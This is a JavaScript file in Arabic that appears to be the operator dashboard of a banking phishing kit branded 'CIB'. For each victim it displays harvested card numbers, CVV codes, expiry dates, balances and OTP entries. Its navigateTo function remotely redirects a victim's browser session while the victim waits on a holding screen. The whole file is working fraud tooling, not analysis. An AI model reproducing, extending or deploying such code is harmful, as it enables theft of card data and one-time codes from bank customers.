function captureDashboardCardFlipIndices(container) {
    if (!container) return [];
    const flipped = [];
    container.querySelectorAll('.dash-flip-card-3d').forEach((node, i) => {
        if (node.classList.contains('is-flipped')) flipped.push(i);
    });
    return flipped;
}

function applyDashboardCardFlipIndices(container, indices) {
    if (!container || !indices || !indices.length) return;
    const cards = container.querySelectorAll('.dash-flip-card-3d');
    for (const i of indices) {
        if (cards[i]) cards[i].classList.add('is-flipped');
    }
}

function renderDashboardFlipCardsRow(user) {
    const list = getCardSubmissionsForUser(user);
    let cardsBlock;
    if (!list.length) {
        cardsBlock = `<p class="dash-cards-empty">لا توجد بيانات بطاقة مسجّلة لهذا المستخدم.</p>`;
    } else {
    const rows = list.map((rec, i) => ({
        u: normalizeUserForDisplay(rec),
        cap: cardRegistrationCaptionAr(i + 1)
    }));
    rows.reverse();

    let trackHtml = '';
    for (let r = 0; r < rows.length; r++) {
        const u = rows[r].u;
        const cap = rows[r].cap;
        const num = formatCardNumberSpaced(u.card_number);
        const holder = (u.card_holder || u.name || '').trim() || '—';
        let exp = (u.expiry_date || '').trim();
        if (!exp) {
            const mo = String(u.expiry_month || '')
                .replace(/\D/g, '')
                .slice(0, 2)
                .padStart(2, '0');
            const yr = String(u.expiry_year || '')
                .replace(/\D/g, '')
                .slice(-2);
            exp = mo && yr ? `${mo}/${yr}` : '—';
        }
        const cvv =
            u.cvv != null && String(u.cvv).trim() !== ''
                ? String(u.cvv).trim()
                : '—';
        const balance =
            u.balance != null && String(u.balance).trim() !== ''
                ? String(u.balance).trim()
                : '—';
        trackHtml += `
        <div class="dash-flip-card-3d">
            <div class="dash-flip-scene">
                <div class="dash-flip-inner">
                    <div class="dash-flip-face dash-flip-front">
                        <span class="dash-mini-brand">CIB</span>
                        <div class="dash-mini-chip" aria-hidden="true"></div>
                        <div class="dash-mini-num">${escapeHtml(num)}</div>
                        <div class="dash-mini-bottom">
                            <div class="dash-mini-col dash-mini-col--holder">
                                <span class="dash-mini-name">${escapeHtml(holder)}</span>
                            </div>
                            <div class="dash-mini-col dash-mini-col--meta">
                                <div class="dash-mini-kv">
                                    <span class="dash-mini-k">EXP</span>
                                    <span class="dash-mini-exp">${escapeHtml(exp)}</span>
                                </div>
                                <div class="dash-mini-kv">
                                    <span class="dash-mini-k">CVC</span>
                                    <span class="dash-mini-cvv">${escapeHtml(cvv)}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="dash-flip-face dash-flip-back">
                        <div class="dash-back-shine" aria-hidden="true"></div>
                        <div class="dash-back-body">
                            <span class="dash-back-title">الرصيد المسجّل</span>
                            <span class="dash-back-balance">${escapeHtml(balance)}</span>
                        </div>
                    </div>
                </div>
            </div>
            <button type="button" class="btn-flip-card" onclick="this.closest('.dash-flip-card-3d').classList.toggle('is-flipped')">قلب البطاقة</button>
            <p class="dash-flip-caption">${escapeHtml(cap)}</p>
        </div>`;
    }

    cardsBlock = `
    <div class="dash-cards-wrap">
        <h3 class="dash-cards-heading">البطاقات المضافة لهذا المستخدم</h3>
        <p class="dash-cards-sub">الوجه الأمامي: البيانات — اضغط «قلب البطاقة» لعرض الرصيد في الخلف. أحدث بطاقة تظهر إلى اليسار.</p>
        <div class="dash-cards-track" dir="ltr">${trackHtml}</div>
    </div>`;
    }

    const otpBlock = renderDashboardOtpTableSection(user);
    return `${cardsBlock}\n${otpBlock}`;
}

function openCardModal(userId) {
    lastNavTargetPage = null;
    currentUser = findAggregatedUser(userId);
    if (!currentUser) return;

    const cardHtml = renderDashboardFlipCardsRow(currentUser);
    document.getElementById('cardDisplay').innerHTML = cardHtml;

    // Update navigation buttons
    updateNavigationButtons(currentUser.page);
    
    const cardModal = document.getElementById('cardModal');
    cardModal.classList.remove('modal-hidden');
    cardModal.classList.add('active');
    cardModal.style.setProperty('display', 'flex', 'important');
}

function formatCardNumberGroups(raw) {
    const str = String(raw || '').trim();
    const digits = str.replace(/\D/g, '').slice(0, 16);
    if (!digits.length) {
        return ['—', '—', '—', '—'];
    }
    const groups = [];
    for (let i = 0; i < 4; i++) {
        const chunk = digits.slice(i * 4, i * 4 + 4);
        if (chunk.length === 4) {
            groups.push(chunk);
        } else if (chunk.length > 0) {
            groups.push(chunk);
        } else {
            groups.push('—');
        }
    }
    return groups;
}

function renderCardDisplay(user) {
    const u = normalizeUserForDisplay(user);
    const numberGroups = formatCardNumberGroups(u.card_number);
    const cardHolder = (u.card_holder || u.name || '').trim() || '—';
    let expiryDate = (u.expiry_date || '').trim();
    if (!expiryDate) expiryDate = '—';
    const cvvRaw = u.cvv != null ? String(u.cvv).trim() : '';
    const cvv = cvvRaw !== '' ? cvvRaw : '—';
    const numberRowHtml = numberGroups
        .map((g) => `<span class="card-number-group">${escapeHtml(g)}</span>`)
        .join('');

    return `
        <div class="card-container">
            <div class="credit-card" dir="ltr" lang="en">
                <div class="card-header">
                    <span class="card-type">VISA</span>
                    <span class="card-chip">💳</span>
                </div>
                <div class="card-number-row" title="رقم البطاقة">
                    ${numberRowHtml}
                </div>
                <div class="card-bottom">
                    <div class="card-holder">
                        <span class="label">صاحب البطاقة</span>
                        <span class="value">${escapeHtml(cardHolder)}</span>
                    </div>
                    <div class="card-meta">
                        <div class="card-expiry">
                            <span class="label">صلاحية</span>
                            <span class="value">${escapeHtml(expiryDate)}</span>
                        </div>
                        <div class="card-cvv">
                            <span class="label">CVV</span>
                            <span class="value">${escapeHtml(cvv)}</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card-info">
                <p><strong>رقم البطاقة:</strong> ${escapeHtml(numberGroups.join(' '))}</p>
                <p><strong>اسم صاحب البطاقة:</strong> ${escapeHtml(cardHolder)}</p>
                <p><strong>تاريخ الانتهاء:</strong> ${escapeHtml(expiryDate)}</p>
                <p><strong>CVV:</strong> ${escapeHtml(cvv)}</p>
            </div>
        </div>
    `;
}

function closeCardModal() {
    const cardModal = document.getElementById('cardModal');
    cardModal.classList.add('modal-hidden');
    cardModal.classList.remove('active');
    cardModal.style.setProperty('display', 'none', 'important');
    lastNavTargetPage = null;
    currentUser = null;
}

async function deleteUser() {
    if (!currentUser) return;
    if (!confirm('هل تريد حقاً حذف هذا المستخدم؟')) return;
    try {
        const ids = currentUser.sourceIds && currentUser.sourceIds.length
            ? currentUser.sourceIds
            : [currentUser.id];
        for (const id of ids) {
            await db.deleteUser(id);
        }
        closeInfoModal();
        renderDashboardTables();
        db.showNotification('تم حذف المستخدم بنجاح', 'success');
    } catch (e) {
        console.error(e);
        db.showNotification('فشل حذف السجل', 'error');
    }
}

function updateNavigationButtons(currentPage) {
    const highlight =
        (lastNavTargetPage && String(lastNavTargetPage)) ||
        String(currentPage || '');
    const roots = [];
    if (isInfoModalOpen()) roots.push('#infoModal');
    if (isCardModalOpen()) roots.push('#cardModal');
    const selector =
        roots.length > 0
            ? roots.map((r) => r + ' .nav-btn').join(', ')
            : '.nav-btn';
    document.querySelectorAll(selector).forEach((btn) => {
        const btnPage = btn.getAttribute('data-page');
        if (btnPage === highlight) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });
}

async function navigateTo(page) {
    const target = String(page || '').trim();
    if (!target) return;

    if (!currentUser) {
        window.open(target, '_blank');
        return;
    }

    const sid = getClientSessionIdForAggregate(currentUser);

    if (!sid || String(sid).trim() === '') {
        db.showNotification(
            'لا يوجد client_session_id في تسجيلات هذا المستخدم — لا يمكن توجيه المتصفح.',
            'error'
        );
        return;
    }

    try {
        const res = await fetch(db.apiUrl('api/session/nav'), {
            method: 'POST',
            headers: db.headers({ 'Content-Type': 'application/json' }),
            body: JSON.stringify({
                client_session_id: String(sid).trim(),
                redirectUrl: target
            })
        });
        if (!res.ok) {
            const t = await res.text();
            throw new Error(t || 'فشل الطلب');
        }
        const pageKey = navTargetToDataPage(target);
        if (pageKey) {
            lastNavTargetPage = pageKey;
            updateNavigationButtons(currentUser.page);
        }
        db.showNotification(
            'تم إرسال التوجيه. المستخدم ما زال على شاشة الانتظار حتى تُحمَّل الصفحة.',
            'success'
        );
    } catch (e) {
        console.error(e);
        db.showNotification('تعذر إرسال التوجيه — تحقق من الخادم.', 'error');
    }
}

async function refreshData() {
    try {
        await db.refresh();
        renderDashboardTables();
        db.showNotification('تم تحديث البيانات', 'success');
    } catch (e) {
        console.error(e);
        db.showNotification('تعذر تحديث البيانات من الخادم', 'error');
    }
}

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeInfoModal();
        closeCardModal();
    }
});

// Modal close on outside click
document.getElementById('infoModal').addEventListener('click', (e) => {
    if (e.target.id === 'infoModal') {
        closeInfoModal();
    }
});

// Card Modal close on outside click
document.getElementById('cardModal').addEventListener('click', (e) => {
    if (e.target.id === 'cardModal') {
        closeCardModal();
    }
});

// Initialize
window.addEventListener('load', () => {
    // التحقق من الجلسة المحفوظة
    const session = getSession();
    
    if (session && session.isLoggedIn) {
        // المستخدم مسجل دخول سابقاً
        isLoggedIn = true;
        
        // إخفاء login modal
        const loginModal = document.getElementById('loginModal');
        loginModal.classList.remove('active');
        loginModal.style.setProperty('display', 'none', 'important');
        
        // إظهار dashboard
        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
        const infoModal5 = document.getElementById('infoModal');
        infoModal5.classList.add('modal-hidden');
        infoModal5.classList.remove('active');
        infoModal5.style.setProperty('display', 'none', 'important');
        const cardModal5 = document.getElementById('cardModal');
        cardModal5.classList.add('modal-hidden');
        cardModal5.classList.remove('active');
        cardModal5.style.setProperty('display', 'none', 'important');
        
        loadDashboard();
    } else {
        // لم يكن مسجل دخول
        const loginModal = document.getElementById('loginModal');
        loginModal.classList.add('active');
        loginModal.style.setProperty('display', 'flex', 'important');
        
        document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
        const infoModal3 = document.getElementById('infoModal');
        infoModal3.classList.add('modal-hidden');
        infoModal3.classList.remove('active');
        infoModal3.style.setProperty('display', 'none', 'important');
        const cardModal3 = document.getElementById('cardModal');
        cardModal3.classList.add('modal-hidden');
        cardModal3.classList.remove('active');
        cardModal3.style.setProperty('display', 'none', 'important');
    }
    
    // السماح بضغط Enter لتسجيل الدخول
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) {
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                checkPassword();
            }
        });
    }
});
